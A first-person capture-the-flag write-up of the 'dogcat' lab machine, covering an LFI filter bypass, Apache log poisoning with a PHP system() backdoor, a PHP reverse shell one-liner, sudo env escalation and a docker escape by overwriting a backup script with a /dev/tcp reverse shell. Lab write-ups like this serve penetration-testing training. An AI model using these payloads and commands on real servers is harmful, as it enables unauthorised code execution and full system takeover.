:dog: :cat:

This system involves a slightly tricky Local File Inclusion (LFI) located on the main Apache web server dogcat application. Then I poison the web servers logs with a simple PHP backdoor and gain code execution by viewing the log file via LFI. I then execute a PHP one liner reverse shell using this backdoor to gain the initial shell as the www-data user. I then escalate my privileges the first time to root using sudo /usr/bin/env gtfo escape. Then I escape the docker container to get actual root by exploiting a writeable backup script. 

## Initial recon
### Nmap scan
I do an fast (-T4) aggressive (-A) version (-SV) can of all (-p-) TCP ports and save the scan to all (-oA) formats and set it to very verbose(-vv) to see results live.

```bash
sudo nmap -sV -A -T4 -vv -p- 10.10.92.56 -oA syn_ver_agg_all_tcp_ports
```

I also run a UDP (U) version scan of the top 1000 ports to see if there might be anything interesting there.

```bash
sudo nmap -sUV -vv 10.10.92.56 -oA udp_ver_top1000_ports
```

```

As you can see only port 22 (SSH) and 80 (Apache Web Server) are open. 
UDP shows port 68 (DHCP) which is not important in this instance.

## Web Server Enumeration

First I manually browse the website and explore its functionality. 
Right off the bat I notice the applications URL **view** parameter which seems like it can be an avanue for an LFI attack.

I tried multiple LFI URL strings such as the traditional way to try and read the /etc/passwd file but they did not work.
This did not work as there is logic in the index.php source code that prevents this from happening easily. There are ways around this however as seen below.
```
http://10.10.124.115/?view=../../../../../../../etc/passwd
```

This did work and if we analyze the index.php source code of the application we can understand that there is logic that need to be fulfilled like it must contain the word dog or cat and that it requires an **ext** parameter to be set or it will default to .php.
```
http://10.10.124.115/?view=./dog/../../../../../etc/passwd&ext=
```

The passwd file did not contain anything interesting.

![dogcat web application](/Images/thm_dogcat_webapp_1.jpg)

I also run a dirbuster scan to see if I can discover any hidden directories or files on the web server.

![dogcat dirbuster scan results](/Images/thm_dogcat_dirbuster_scan.jpg)

The flag.php file looks interesting. I tried to read the file using a PHP filter wrapper code that converts the file to base64 and outputs it so I can read the flag.php code without executing it. 

This gives me the ability to also read the applications source code and thus I was able to see the index.php source code that reveals that we need to include the word dog or cat and set the **ext** parameter.

```
# Read the first flags contents
http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../flag
# Read the index.php source code
http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../index
```

![Local File Inclusion](/Images/thm_dogcat_lfi_1.jpg)

Base64 decode the string outputted and that will display the contents of the flag.php file.

Here is the index.php source code that I got via the LFI and PHP filter wrapper method.

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

## Local File Inclusion to Code Execution.

So now that I know I can read files I try to read the Apache server logs located at /var/log/apache2/access.log using the LFI.
I then poison the log file with a simple PHP backdoor code that will give me code execution on the system.
I first capture a simple GET request to the application using burpsuit proxy.
I then modify the **User-Agent:** header and insert the following PHP code into it.

```php
<?php system($_GET['cmd']);?>
```

Now that we I have poisoned the logs I try to execute a simple whoami command to see if it works and it does.
```
http://10.10.124.115/?view=dog../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

![dogcat LFI to code execution](/Images/thm_dogcat_lfi_2.jpg)

Now I use the following PHP reverse shell oneliner from pentestmonkey.net
```
php -r '$sock=fsockopen("10.11.11.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![LFI to reverse shell](/Images/thm_dogcat_burpsuit_2.jpg)

I had to URL encode all characters in the php reverse shell code to get it to work properly.

![URL encoded php reverse shell]\(Images\thm_dogcat_burpsuit_3.jpg)

I start a netcat listener on my attacking machine on port 1234 and then send the above GET request using burpsuit to gain the initial shell on the system as the ***www-data** user. With a tiny bit of directory enumeration I find the second flag.

```
sudo nc -nvlp 1234
```

![Images\thm_dogcat_initial_shell.jpg]

## Privilege Escalation

I do a the following sudo command to see what I can execute as sudo.
```
sudo -l
```

![SUDO Privilege Escalation via env](/Images/thm_dogcat_flag3.jpg)

I see that I can execute /usr/bin/env as sudo. I go to GTFOBins and find a way to escalate my privileges to root.

https://gtfobins.github.io/gtfobins/env/#sudo

I simply execute the following code as sudo to get a shell as root.

```
sudo env /bin/sh
```

My first got to for quick enumeration is [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script.
I host it on my attacking machine using a simple python3 web server with the command below on port 80
```
sudo python3 -m http.server 80
```

I downloaded linpeas using curl as wget was not available. Adjusted the files permissions to execute and then ran it.
```
cd /tmp
curl http://10.11.11.11/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 
```

I noticed two odd things that indicated that we were in a docker container. The first being a random hostname and the second being the .dockerenv file.

![Docker Files](/Images/thm_dogcat_docker.jpg)

## Escaping Docker Container

Upon further enumeration I found backup.sh script file located in the /opt/backup directory.
Writing the following reverse shell bash code to the backup.sh file results in a root shell outside of the container.
```
echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.11.11.11/9001 0>&1" >> backup.sh
```

Run a listener on the attacking machine and get root shell.
```
sudo nc -nvlp 9001
```

![Root and Flag 4](/Images/thm_dogcat_root_and_flag4.jpg)

That marks the end of this system, obtaining all 4 flags.
